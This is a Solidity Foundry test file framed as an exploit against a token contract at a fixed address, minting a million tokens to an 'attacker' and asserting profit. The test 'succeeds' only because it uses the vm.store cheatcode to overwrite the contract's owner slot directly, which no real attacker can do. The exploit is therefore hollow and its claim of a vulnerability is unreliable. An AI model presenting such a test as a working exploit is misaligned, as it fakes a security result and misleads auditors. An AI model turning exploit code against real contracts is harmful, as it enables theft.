pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function mint(address account, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        vm.label(TARGET, "CoinToken Victim");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalance = ICoinToken(TARGET).balanceOf(attacker);

        // Overwrite owner storage slot (slot 0) to make attacker the owner
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Mint tokens to attacker (1 million tokens with 18 decimals)
        uint256 mintAmount = 1_000_000 * 1e18;
        ICoinToken(TARGET).mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBalance = ICoinToken(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after minting");
        assertEq(finalBalance, initialBalance + mintAmount, "Balance should equal initial + minted amount");
        uint256 finalBalanceERC20 = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

